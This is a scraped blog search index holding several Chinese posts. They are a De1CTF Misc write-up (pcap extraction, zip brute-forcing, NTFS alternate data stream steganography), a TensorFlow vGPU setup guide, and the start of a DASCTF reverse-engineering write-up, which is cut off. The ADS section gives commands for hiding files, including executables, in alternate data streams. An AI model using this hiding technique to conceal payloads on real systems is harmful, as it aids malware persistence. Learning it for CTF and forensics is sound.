CyberChef，我才不会说之前一直想搭但一直没整呢。 网址在这里：https://chef.miaotony.xyz/ 不带各种页面统计，不收集隐私信息，欢迎来玩来 BAKE 呀！ 简而言之，它就是可以处理包括但不限于各种编码各种加密各种转换的一个在线工具，可以把一系列处理流程放进 菜谱 Recipe 里，然后 BAKE 就出结果啦！ 下面是官方的介绍。 The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis The Cyber Swiss Army Knife CyberChef is a simple, intuitive web app for carrying out all manner of “cyber” operations within a web browser. These operations include simple encoding like XOR or Base64, more complex encryption like AES, DES and Blowfish, creating binary and hexdumps, compression and decompression of data, calculating hashes and checksums, IPv6 and X.509 parsing, changing character encodings, and much more. The tool is designed to enable both technical and non-technical analysts to manipulate data in complex ways without having to deal with complex tools or algorithms. It was conceived, designed, built and incrementally improved by an analyst in their 10% innovation time over several years. 官方 GitHub 仓库在这里。 大概就这样了8 （溜","path":"2020/05/24/CTF_BJDCTF3rd/"},{"title":"CTF | 2020 De1CTF Misc Chowder WriteUp","text":"引言奔涌吧，后浪！今天是五四青年节，节日快乐呀！ 这几天有个 De1CTF，五一前几天出去玩了，考虑到今天早上比赛就结束了，于是昨晚来看了一眼题目，做了个 Misc 杂烩题来感受一下，还是挺有意思的。 De1CTF 2020 竞赛时间： 2020-05-02 09:00:00——2020-05-04 09:00:00参赛方式：组队 本届De1CTF是由XCTF联赛的合作单位De1ta战队组织，由赛宁网安提供技术支持。作为第六届XCTF国际联赛的分站赛，本次比赛将采用在线网络安全夺旗挑战赛的形式，面向全球开放。 此次比赛冠军队伍将直接晋级第六届XCTF总决赛（总决赛具体地点时间待定，将在确定后通知获得资格的国际和国内队伍）。其他参赛的队伍也将获得积分，来竞争XCTF决赛的其他席位。 大多数情况下，flag的形式为De1CTF{this_is_a_sample_flag}，请提交包含De1CTF{}的完整flag，来进行得分；如果flag是其他形式，题目中会阐明。 比赛平台： https://adworld.xctf.org.cn 面向全球开放可还行，于是乎比赛题目都双语的，还用了 Google Drive 做附件存储。看了一下排行榜，歪果师傅们贼厉害啊。 最后顺便总结了一下关于 NTFS 交换数据流的相关应用吧。 Misc杂烩/Misc Chowder https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing Hints: 流量包中的网络连接对解题没有帮助 The network connection in pcap is not helping to the challenge 不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取 Do not need to connect the network, every data can be extracted from the pcap In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are “D” and “E”. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。 网络流量提取首先 Google Drive 下载下来是个流量抓包文件 Misc_Chowder.pcap。 根据提示，网络连接和服务器地址都没用的，那直接导出 HTTP 对象好了。 按照大小排序发现是上传文件的页面，表格里是上传的文件。 依次有7张图片，分别导出来。 前6张是正常的图片，第7张 7.png，是一个 Google Drive 的分享地址。 也就是 https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view （这里最开始我数字1和字母l没分清楚，于是访问了没分享文件，仔细看了才发现…… Word 隐写下载后解压得到一个 readme.docx，打开报错，看来文件里改了啥东西。 选择是后得到以下内容，看起来好像是没啥关系（确定）。 看了一下文本也没有隐藏文字，看来是 word 内容用处不大。 我们都知道，.docx格式的 word 其实对应着一个压缩包，那就用压缩文件打开看看。 发现直接就在目录下，简单干脆真好。 压缩包密码暴破You_found_me_Orz.zip 里有一个 You_found_me_Orz.jpg，题目中有 hint 说 密码的长度为6位，前两位为DE。于是就来爆破好了。 使用 DE???? 进行掩码爆破，最开始先试了一下纯大写字母、纯小写字母、纯数字、大小写字母组合，发现都不对，后来试了大写字母和数字组合，跑了一阵子密码出来了。就是 DE34Q1. 话说为啥这个不能跑满 CPU，感觉爆破好慢…… 正好有带佬发现了一个破解 zip 文件的工具/库，叫 yazc (Yet Another Zip Cracker). 仓库在这里：https://github.com/mferland/libzc The libzc library is a simple zip cracking library. It also comes with a command line tool called ‘yazc’ (Yet Another Zip Cracker). 不过对于掩码爆破，估计要先生成一个字典再来爆破。 解压后得到了这张图片。 图像隐写拖进 010editor 里看了一下，发现文件拼接了一个rar压缩包。 foremost 没提取出来，于是手动提取一波得到了这个压缩包。 解压上面的 rar 压缩包，得到的flag.txt内容如下： De1CTF{jaivy say that you almost get me!!! } 啥？？？又有假的 flag！不过快了快了。 （顺便查了一下jaivy是个师傅的 ID 123.txt this is a 123.txt file from jaivy! 666.jpg 假的 jpg，实际上是 png 啦。 看了半天这个图片，都没找到哪里有隐写……常见的图像隐写都不起作用。 NTFS 交换数据流隐写最后又去看了看压缩包的 Hex，发现最后这里有个奇妙的东西看着就不对劲。 你看它多像 flag 呀！ 再看这个冒号:，突然想起来之前看师傅们关于内存取证的 WP 里提到过 NTFS 交换数据流隐写，虽然没细看，但说不定这里就是呢！ 于是查了一下相关的资料。 在 NTFS 文件系统中存在着 NTFS 交换数据流（Alternate Data Streams，简称 ADS），这是 NTFS 磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是 NTFS 交换数据流。 ADS 的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个 favicon 数据流以存放网站图标。 ADS 也被用于一些恶意文件隐藏自身,作为后门。 要查看 ADS 内容，可以使用 Ntfs Streams Editor 软件，或者 LADS，或者用 dir /r。 要注意的是，这里有个坑，使用除 WinRAR 以外的软件进行提取会造成数据流丢失。所以必须要用 WinRAR 来解压才行！ 这里坑死我了，我用 Bandizip 解压后找了半天都没找到这个 txt 文件，最后迫不得已下了个 WinRAR，广告烦死了（（ 解压后通过 dir /r 可以看到哪里有 ADS。 这里发现就藏在 666.jpg 里了呀！ 使用 notepad 可以查看里面的内容了。 notepad 666.jpg:fffffffflllll.txt 于是 flag 就是 De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb} 关于 NTFS ADS 的一些总结这里顺便再整理一下吧，方便后面需要的时候来找。 查看 ADSLADS除了使用上面的方法查看外，还可以使用 LADS 工具。 下载地址： 戳这里 使用方法： 搜索 File 所在目录及其子目录下的所有数据流：（/S表示递归子目录） lads.exe File /S 或者把lads复制到要搜索的目录，就不用指定file了。 lads.exe /S 而后再用 notepad 之类打开就完事了。 或者也可以用 powershell 查看内容。 利用 -Stream 参数来提取。 cat .\\666.jpg -Stream fffffffflllll.txt # 其实就是 Get-Content .\\666.jpg -Stream fffffffflllll.txt 不过怎么说呢，这个软件挺老了，作者网站上说Windows下用 dir /r 都有这个功能了，于是不再需要 LADS 了，也因此不提供下载了，妙啊 2333. AlternateStreamView这个网上一搜就有下载了。 使用起来也简单方便。支持数据流的查看和提取。 Ntfs Streams Editor下载地址： https://ntfs-streams-info.en.softonic.com/ 或者 http://pan.baidu.com/s/1c2zbNaC 使用起来也很方便，搜索文件所在目录就可以了，而且直接就把隐藏在 ADS 中的内容显示出来了。 （就是这个软件报毒说有广告啥的，emmm 看个人吧，也是个老软件了 当然，貌似用一些内存取证的工具也能提取，这里不说了啦。 写入 ADSecho首先创建一个文件，再写入隐藏的信息。 echo \"hello\" &gt; 1.txt echo \"miaotony\" &gt; 1.txt:2.txt 注意一下，用dir是看不到这个隐藏的数据流哒。 同理使用 binwalk / foremost 也不能看到隐写的数据。 type还可以使用type命令，将已经存在的文件附加上去。 # type \"要隐藏的附加文件\"&gt;\"宿主文件\":\"要隐藏的附加文件\" type \"2.txt\" &gt; \"1.txt\":\"2.txt\" 可以用它来向 ADS 中写入图像/音频/可执行文件。 type \"hidden.jpg\" &gt; \"targe.jpg\":\"hidden.jpg\" type \"hidden.mp4\" &gt; \"targe.jpg\":\"hidden.mp4\" type \"hidden.exe\"&gt;&gt;\"targe.txt\":\"hidden.exe\" type \"hidden.exe\"&gt;&gt;\"targe.exe\":\"hidden.exe\" 不过在 Windows Vista 及后续系统中已经无法直接运行 ADS 中的可执行文件了。 删除 ADS可以使用 Ntfs Streams Editor，搜索到勾选删除就好。 也可以使用streams.exe这个软件删除。 下载地址：戳这里 streams.exe -d &lt;File&gt; 加入-s参数则递归子目录删除。 如果报错就先把相关的进程结束掉再执行。 注意不要在根目录下执行，以防删除有用的数据流呀。 小结再说个有意思的事，浏览器下载文件的时候，会向文件添加一个数据流，标记该文件来源于外部，即可能带有风险。 估计 office 提示也是根据这个来的吧，嘻嘻。（之前还想过这个问题呢 233 主要蹭这个机会理了一下 NTFS 交换数据流的相关应用。 这次 De1CTF 题目质量还是很不错的，Misc 签到题 Telegram Channel 看一眼就能拿分，问卷题访问就拿到手了，还是很友好的呢。 至于出现一堆 mc_*与 minecraft 有关的题，出题人是多喜欢 MC 啊，emmm 太难了没搞懂（虽然没细看。 什么 easybgm 噢真没找到隐写在哪里。。 大概就是这些内容了吧。 （溜了溜了 结课论文要写不完了 ReferenceNTFS交换数据流隐写的应用 NTFS交换数据流隐写（上）","path":"2020/05/04/CTF_2020De1CTF/"},{"title":"Ubuntu16.04配置TensorFlow-vGPU环境","text":"0x00 前言众所周知，机器学习对于计算机的算力要求很高，而 GPU 中的并行计算能有效地提高计算效率。NVIDIA 家的 GPU 大都支持 CUDA（Compute Unified Device Architecture）平台，TensorFlow 等机器学习/深度学习框架大都以 CUDA 为基础实现了 GPU 加速计算。 CUDA ® is a parallel computing platform and programming model developed by NVIDIA for general computing on graphical processing units (GPUs). With CUDA, developers are able to dramatically speed up computing applications by harnessing the power of GPUs. CUDA（Compute Unified Device Architecture，统一计算架构）是由NVIDIA所推出的一种集成技术，是该公司对于GPGPU的正式名称。透过这个技术，用户可利用NVIDIA的GeForce 8以后的GPU和较新的Quadro GPU进行计算。亦是首次可以利用GPU作为C-编译器的开发环境。 另外提一下 vGPU，这个概念好像是2018年提出来的，还算比较新的。考虑到有些程序需要在 Linux 环境下运行，而在 Windows 下一个选择是开一个虚拟机。之前还在想虚拟机里能不能用独立显卡，能否实现在虚拟机里调用 CUDA 进行计算。vGPU 的出现就提供了这一可能。 vGPU 即虚拟 GPU，可以为每个虚拟桌面提供 GPU 体验。NVIDIA 虚拟 GPU 软件使每台虚拟机都能像物理桌面一样利用 GPU。由于通常由 CPU 完成的工作已经转移到了 GPU，因此用户能够获得更好的体验，并且可以支持更多的用户。 其实按我的理解，简单来说就是对物理上的 GPU 做了虚拟化，这样在虚拟机上可以共享一个或多个 GPU。使用的时候就和平常用真实的 GPU 没有什么区别。感觉还是挺不错的，一定程度上有利于资源的合理利用嘛。不过具体的原理我也不清楚呢。（悄咪咪 更多关于 vGPU 的信息可以去官网了解一下。 其实之前配过 Windows 系统上的 GPU，成功实现了的。（然而不记得了） 然而上次配 CentOS 系统上的 GPU，有点问题折腾了好久一直都用不了，于是不知道怎么整就一直闲置着…… 最近别人帮忙换了 Ubuntu 系统，重新配置了一下 GPU 资源，装好了显卡驱动。然后我折腾了一个下午，终于在 Ubuntu 16.04 系统上配置好了 TensorFlow 的 vGPU 环境，这里来做一下笔记啦。（不然过几个月甚至过几天就不记得了呢） （什么时候成运维的了。。 唉，其实挺麻烦的，这里面也挺多坑的，特别是版本问题很容易导致配置失败。这里参考了挺多网上的资料还有前人分享的经验教训，以软件配置为主，大概包括下面几个步骤吧。 安装 Ubuntu 虚拟机 安装 NVIDIA 显卡驱动及授权 安装 CUDA Toolkit 安装 Anaconda3 安装 tensorflow-gpu 版本（包括了 cuDNN） 0x01 安装前准备请确认要安装的各软件的版本之间是否匹配，如果不匹配很容易就配置失败了！ 我这里的系统是 Ubuntu 16.04。 （Linux下）tensorflow-gpu 版本与 cuDNN 及 CUDA 版本关系如下，最新版本及其他系统请参考官方这里。 Tensorflow 2.x 版本挺新的，API 也改了不少，这里看1.x版本好了。 目前 Tensorflow 1.x 版本最新的是 1.15.0 了，上面这些是经过测试的构建配置，新版本的 CUDA 和 cuDNN 不保证一定能用，但低版本不行的。特别是 CUDA 和 cuDNN 版本要对应上。 CUDA Toolkit 与 显卡驱动之间的对应关系如下，最新版本请参考官方这里。 这里是 CUDA 工具包所要求的显卡驱动的最低版本。 例如 TensorFlow-gpu 1.13 以上版本需要 CUDA 10.0，显卡驱动至少要 410.48 以上这样。 0x02 安装 Ubuntu 虚拟机这里是以服务器上安装为例的，我这里现成配好了的，大概就参考下面这一篇好了。 https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141 0x03 安装 NVIDIA 显卡驱动及授权这里别人帮配好了的，同样参考上面那一篇，这里记录一下吧，顺便借一下图。 0x03-1 安装显卡驱动虚拟机新建一个文件夹，然后上传类似于 NVIDIA-Linux-x86_64-430.63-grid.run 的显卡驱动文件。 注意一下这个版本要满足 0x01 中的条件。 或者可以这样↓。 首先添加源。 sudo add-apt-repository ppa:graphics-drivers/ppa sudo apt update 检查可以安装的驱动版本，选择最合适的版本安装即可。 sudo apt install nvidia-driver-XXX 安装显卡驱动的时候需要注意，先执行sudo init 3 然后在驱动文件目录下执行sudo sh 显卡驱动名 --no-opengl-files （加--no-opengl-files的目的是为了防止图形界面登录的时候循环输入密码的情况），然后按照提示执行下一步就可以。 显卡安装完成后进行检查，**执行nvidia-smi**，如果输出类似如下，则代表显卡安装成功。 类似于下面这样的。（我这里显卡驱动版本为 440.56） +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.56 Driver Version: 440.56 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 GRID P100D-2Q On | 00000000:02:00.0 Off | N/A | | N/A N/A P0 N/A / N/A | 144MiB / 2032MiB | 0% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 0x03-2 显卡授权下面进行显卡授权的配置。 如果使用的是切分显卡，那么授权一定是 vDWS 授权类型，此处需要提前先部署好 vGPU 授权服务器，授权服务器的部署，此处不再赘述。 然后再虚拟机中配置授权信息，执行命令cd /etc/nvidia，然后ls查看会有一个授权文件配置模板，然后执行命令 sudo cp gridd.conf.template gridd.conf。 编辑授权信息，执行 sudo vim gridd.conf，然后需要配置三个地方，也即授权服务器的地址、端口、以及授权类型，填写完成保存之后执行命令 systemctl restart nvidia-gridd。 而后在授权服务器确认虚拟机是否已经获取到授权。 到这里为止，下面的步骤就和 vGPU 没有很大的关系了，就当物理机上的真实 GPU 使用就好了。 也就是说下面的步骤对于 Linux 下的 GPU 理论上都是通用的啦。 0x04 利用 Docker 快速启用 TensorFlow GPU 支持这里打断一下，说一个快速启用 TensorFlow GPU 支持的方案。如果只是想体验一下，或者在 docker 中构建的话，可以参考一下，不需要后面的步骤就能快速启用了。 Docker 使用容器创建虚拟环境，以便将 TensorFlow 安装结果与系统的其余部分隔离开来。TensorFlow 程序在此虚拟环境中运行，该环境能够与其主机共享资源（访问目录、使用 GPU、连接到互联网等）。我们会针对每个版本测试 TensorFlow Docker 映像。 Docker 是在 Linux 上启用 TensorFlow GPU 支持的最简单方法，因为只需在主机上安装 NVIDIA® GPU 驱动程序，而不必安装 NVIDIA® CUDA® 工具包。 （来自官方 Docker 安装教程） 首先（在虚拟机上）安装 docker，而后需要**安装 NVIDIA Docker 支持**。 请通过 docker -v 检查 Docker 版本。对于 19.03 之前的版本，您需要使用 nvidia-docker2 和 --runtime=nvidia 标记；对于 19.03 及之后的版本，您将需要使用 nvidia-container-toolkit 软件包和 --gpus all 标记。 注意：请确保已正确安装 Nvidia 显卡驱动，docker 版本&gt;=19.03！ 这样就不需要安装 CUDA toolkit 了。 目前最新的 docker 就是 19.03.8 版本，所以用nvidia-container-toolkit 软件包和 --gpus all 标记。 0x04-1 安装 nvidia-container-toolkit（Ubuntu 16.04/18.04, Debian Jessie/Stretch/Buster） # Add the package repositories distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add - curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit sudo systemctl restart docker 之后就可以测试一下能否在docker里调用显卡了。 #### Test nvidia-smi with the latest official CUDA image docker run --gpus all nvidia/cuda:10.0-base nvidia-smi 正常的话效果与 nvidia-smi效果相同。 下面这几个是指定特定显卡的。 # Start a GPU enabled container on two GPUs docker run --gpus 2 nvidia/cuda:10.0-base nvidia-smi # Starting a GPU enabled container on specific GPUs docker run --gpus '\"device=1,2\"' nvidia/cuda:10.0-base nvidia-smi docker run --gpus '\"device=UUID-ABCDEF,1\"' nvidia/cuda:10.0-base nvidia-smi # Specifying a capability (graphics, compute, ...) for my container # Note this is rarely if ever used this way docker run --gpus all,capabilities=utility nvidia/cuda:10.0-base nvidia-smi 0x04-2 拉取 tensorflow 官方镜像&amp;运行代码 标记 说明 latest TensorFlow CPU 二进制映像的最新版本。（默认版本） nightly TensorFlow 映像的每夜版。（不稳定） version 指定 TensorFlow 二进制映像的版本，例如：2.1.0 devel TensorFlow master 开发环境的每夜版。包含 TensorFlow 源代码。 每个基本标记都有用于添加或更改功能的变体： 标记变体 说明 tag-gpu 支持 GPU 的指定标记版本。 tag-py3 支持 Python 3 的指定标记版本。 tag-jupyter 带有 Jupyter 的指定标记版本（包含 TensorFlow 教程笔记本） 下载并运行支持 GPU 的 TensorFlow 映像，而后运行这行代码测试一下。 docker run --gpus all -it --rm tensorflow/tensorflow:latest-gpu \\ python -c \"import tensorflow as tf; print(tf.reduce_sum(tf.random.normal([1000, 1000])))\" 镜像大概2个G吧，拉取镜像挺久的……上面这个拉取的是最新版本的GPU镜像。可以通过上面这个测试一下是否安装成功。之后可以利用docker exec 重用容器。 使用最新的 TensorFlow GPU 映像在容器中启动 bash shell 会话： docker run --gpus all -it tensorflow/tensorflow:latest-gpu bash 要在容器内运行在主机上开发的 TensorFlow 程序，请装载主机目录并更改容器的工作目录 (-v hostDir:containerDir -w workDir)： docker run --gpus all -it --rm -v $PWD:/tmp -w /tmp tensorflow/tensorflow:latest-gpu python ./script.py 要调用 GPU 的时候记得加上--gpus all标记呀！ 0x05 安装 CUDA Toolkit如果要直接（在虚拟机上）跑程序的话，需要装 CUDA 工具包。 这一步很关键，最开始我以为显卡上显示了 CUDA Version 就装好 CUDA 了，到最后一系列装完在 python 里测试 GPU 的时候报错说 tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable 到谷歌查了挺多资料都没解决（上面这个问题可以参考这里有一些可能的解决方案），折腾了老半天才发现是 CUDA Toolkit 没装……还是在上一步中用 docker 测试才发现的呢。 执行 nvidia-smi 得到的CUDA Version应该是 CUDA Driver 的版本，这里要装的 CUDA Toolkit 对应的是 Runtime version 吧（猜的）。 根据 0x01 中的版本关系，以及上面 docker 中运行的 CUDA 版本，这里我用了 10.1.243 版本，可以在 CUDA Toolkit 10.1 update2 Archive 这里看下载地址。目前不推荐用最新的10.2版本，当然随着发展后续肯定会更新另说。 wget http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_418.87.00_linux.runsudo sh cuda_10.1.243_418.87.00_linux.run 这里安装界面挺有意思的，命令行里的折叠菜单，想不到吧！ 注意一下：这里不要选 Driver 了，在Driver那里敲个回车把X去掉。因为你驱动已经装好了啦，而且比这个新。（截图的时候没有去掉懒得重新截了） 安装完之后要把路径加入到 PATH 里。 sudo vim ~/.bashrc 在最后新增下面几行。 # CUDA config export LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH:/usr/local/cuda/lib64:/usr/local/cuda/extras/CUPTI/lib64\" export CUDA_HOME=\"/usr/local/cuda\" export PATH=\"/usr/local/cuda/bin:$PATH\" 使配置生效（或重启终端也行）。 source ~/.bashrc 验证一下有没有安装成功。 miaotony@localhost:~# nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2019 NVIDIA Corporation Built on Sun_Jul_28_19:07:16_PDT_2019 Cuda compilation tools, release 10.1, V10.1.243 如果上面安装时候装了实例的话，可以来测试一下。 cd /usr/local/cuda/samples/1_Utilities/deviceQuery/ sudo make ./deviceQuery 这里就显示出了显卡的各种参数，最后Result=PASS则说明安装成功了。 当然也可以试试别的例子，先编译再执行就好。 0x06 安装 Anaconda3这里选择用 Anaconda 来安装，不仅因为有很多常用的科学计算库，而且后面会说 tensorflow-gpu 里还自带了满足版本要求的 cuDNN。（我也是这次才知道的呢 0x06-1 下载&amp;安装到官方这里下载 https://www.anaconda.com/products/individual。 2020.02版本 64-Bit (x86) Installer (522 MB) 按照提示安装，最好都输入yes，重启终端后会自动初始化 conda 的默认环境。 输入 conda --version，出现版本号则安装成功。 0x06-2 换源众所周知官方的 conda 源速度比较慢，换清华 tuna 源吧。 （记得有段时间因为版权问题 tuna 镜像还中断过一阵子，后来放开了） conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes 0x07 安装 tensorflow-gpu （包括 cuDNN）0x07-1 新建一个虚拟环境（可选的啦）名为tensorflow，指定 python 版本为3.6。（这个看个人以及需求吧） conda create -n tensorflow python=3.6 可能需要确认就回车或者输入y完事。 0x07-2 安装 tensorflow-gpu首先查一下当前环境下支持的版本。 conda search tensorflow-gpu 注意一下驱动的版本问题，对于新的tf版本，驱动可能不支持。 比如装1.15.0版本。 conda install tensorflow-gpu==1.15.0 大概六七百MB的亚子，网络不是很稳定，大概率需要重试几次才行。 0x07-3 验证安装安装完成后，进入python试一试呗。 import tensorflow as tf print(tf.test.is_gpu_available()) 显示为True则表示以上安装成功了！ （tf 2.x 的话这个方法已经 deprecated 了，建议用tf.config.list_physical_devices('GPU') 方法。tf 1.x 无此用法。 WARNING: tensorflow:From &lt;stdin&gt;:1: is_gpu_available (from tensorflow.python.framework.test_util) is deprecated and will be removed in a future version.Instructions for updating:Use tf.config.list_physical_devices('GPU') instead. 也可以运行一个程序，然后另外再开一个终端，利用 nvidia-smi 查看显卡情况。 在 Processes 里看到运行的任务就成功了呀！ 哇好耶！！！ 终于搞定了！！！ 之后你就可以愉快地炼丹啦！ 0x08 小结其实主要就是这几个步骤： 安装 Ubuntu 虚拟机 安装 NVIDIA 显卡驱动及授权 安装 CUDA Toolkit 安装 Anaconda3 安装 tensorflow-gpu 版本（包括了 cuDNN） 或者 安装 Ubuntu 虚拟机 安装 NVIDIA 显卡驱动及授权 安装 Docker nvidia-container-toolkit 拉取 tensorflow-gpu 镜像 其实过程挺麻烦的，而且遇到了不少坑，比如我这次的一部分经历…… 显卡驱动装了，nvidia-smi 看没问题，还有个 CUDA Version 就以为有 CUDA 了。装好 anaconda，然后用 conda install tensorflow-gpu，这里面附带了 cuDNN。然后测试 GPU 的时候给我报 tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable这个错误。。谷歌搜了老半天没搞懂，然后去装了 NVIDIA Container Toolkit，拉了个 tf 的 Docker 镜像跑，发现是没问题的。最后想到是不是 CUDA 没装，于是看了 tf 镜像用的 CUDA 版本是10.1.243，去官网找来装上。再回来到 conda 环境里测试，终于好了。。 特别是觉得马上要完事了，在验证 GPU 时候就发现报错了那种时候，很绝望不是吗。 不过一步一步来还是可以成功安装的，哇是有点成就感 23333. 机器学习/深度学习有空慢慢学呢（ 呜，感觉莫名奇妙成运维的了，嘤嘤嘤不要。 （（溜了溜了喵 0xFF References &amp; Extensive Reading NVIDIA 虚拟 GPU 深信服超融合Tensorflow-vGPU版配置指导 NVIDIA CUDA Toolkit Release Notes TensorFlow 官方安装教程 Ubuntu 18.04安装CUDA和cuDNN Ubuntu16.04下安装cuda和cudnn的三种方法 TensorFlow 安装与环境配置（简单粗暴 TensorFlow 2） RuntimeError: CUDA error: all CUDA-capable devices are busy or unavailable","path":"2020/04/29/Server_TensorFlow-vGPU/"},{"title":"CTF | 2020 DASCTF 四月春季战 Re&Misc WriteUp","text":"前言 安恒月赛，2020年DASCTF——四月春季战。 比赛时间：2020年4月25日下午13:30-17:30 比赛平台：https://www.linkedbyx.com/studyCenter/36998/tasks 请提交flag{}/DASCTF{}括号里面的内容。 今天下午有个 DASCTF 安恒月赛，四月春季战，难度据赵师傅说“雨露均沾”，就来看了看题。 其实还是大概比赛开始之后一两个小时才注册的，于是划了个水，大概看了几道 Re 和 Misc 的题，随便写写 WP 吧。 （其实也没几道题会做的，有的还是赛后补的，呜。 Reverse入门reverse题目附件：在这里 拖进 IDA 看下。 int __cdecl main(int argc, const char **argv, const char **envp) { size_t i; // [esp+28h] [ebp-80h] char v5; // [esp+30h] [ebp-78h] char v6[8]; // [esp+A0h] [ebp-8h] _alloca(0x10u); __main(); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"input your key: \"); std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, &amp;v5); for ( i = 0; i &lt; strlen(&amp;v5); ++i ) v6[i - 112] = (v6[i - 112] ^ 6) + 1; if ( !strcmp(&amp;v5, \"akhb~chdaZrdaZudqduvdZvvv|\") ) std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"yes!you are right\"); else std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"try again\"); system(\"PAUSE\"); return 0; } A0h-30h 正好就是十进制的 112，于是 v6[i - 112] 对应的就是 v5 的地址。 Exp： # -*- coding:utf-8 -*- s=\"akhb~chdaZrdaZudqduvdZvvv|\" new='' for i in s: t=(ord(i)-1)^6 new+=chr(t) print(new) flag{daef_wef_reverse_sss} 哇好耶，好久没看到这么简单的 Re 题了唉！ encrypt3题目附件：在这里 同样拖进 IDA。 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rax __int64 v5; // rdx __int64 v6; // rax __int64 v7; // rdx __int64 v8; // rax __int64 v9; // rdx char v10; // [rsp+17h] [rbp-49h] int v11; // [rsp+18h] [rbp-48h] int i; // [rsp+1Ch] [rbp-44h] int j; // [rsp+20h] [rbp-40h] int k; // [rsp+24h] [rbp-3Ch] __int64 v15; // [rsp+28h] [rbp-38h] char v16; // [rsp+30h] [rbp-30h] char v17; // [rsp+31h] [rbp-2Fh] char v18; // [rsp+32h] [rbp-2Eh] char v19; // [rsp+33h] [rbp-2Dh] char v20; // [rsp+34h] [rbp-2Ch] char v21; // [rsp+35h] [rbp-2Bh] char v22; // [rsp+36h] [rbp-2Ah] char v23; // [rsp+37h] [rbp-29h] char v24; // [rsp+38h] [rbp-28h] char v25; // [rsp+39h] [rbp-27h] char v26; // [rsp+3Ah] [rbp-26h] char v27; // [rsp+3Bh] [rbp-25h] char v28; // [rsp+3Ch] [rbp-24h] char v29; // [rsp+3Dh] [rbp-23h] char v30; // [rsp+3Eh] [rbp-22h] char v31; // [rsp+3Fh] [rbp-21h] char v32; // [rsp+40h] [rbp-20h] char v33; // [rsp+41h] [rbp-1Fh] char v34; // [rsp+42h] [rbp-1Eh] char v35; // [rsp+43h] [rbp-1Dh] char v36; // [rsp+44h] [rbp-1Ch] char v37; // [rsp+45h] [rbp-1Bh] char v38; // [rsp+46h] [rbp-1Ah] char v39; // [rsp+47h] [rbp-19h] char v40; // [rsp+48h] [rbp-18h] char v41; // [rsp+49h] [rbp-17h] char v42; // [rsp+4Ah] [rbp-16h] char v43; // [rsp+4Bh] [rbp-15h] char v44; // [rsp+4Ch] [rbp-14h] char v45; // [rsp+4Dh] [rbp-13h] char v46; // [rsp+4Eh] [rbp-12h] char v47; // [rsp+4Fh] [rbp-11h] char v48; // [rsp+50h] [rbp-10h] char v49; // [rsp+51h] [rbp-Fh] char v50; // [rsp+52h] [rbp-Eh] char v51; // [rsp+53h] [rbp-Dh] char v52; // [rsp+54h] [rbp-Ch] char v53; // [rsp+55h] [rbp-Bh] unsigned __int64 v54; // [rsp+58h] [rbp-8h] v54 = __readfsqword(0x28u); v16 = 38; v17 = 44; v18 = 33; v19 = 39; v20 = 59; v21 = 35; v22 = 34; v23 = 115; v24 = 117; v25 = 114; v26 = 113; v27 = 33; v28 = 36; v29 = 117; v30 = 118; v31 = 119; v32 = 35; v33 = 120; v34 = 38; v35 = 114; v36 = 117; v37 = 113; v38 = 38; v39 = 34; v40 = 113; v41 = 114; v42 = 117; v43 = 114; v44 = 36; v45 = 112; v46 = 115; v47 = 118; v48 = 121; v49 = 112; v50 = 35; v51 = 37; v52 = 121; v53 = 61; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Please input your magic number\", a3); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v11); if ( v11 &lt;= 9 ) return 0xFFFFFFFFLL; v15 = operator new[](v11); for ( i = 0; i &lt; v11; ++i ) std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, i + v15); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"You have input sth.\", v5); std::ostream::operator&lt;&lt;(v6, 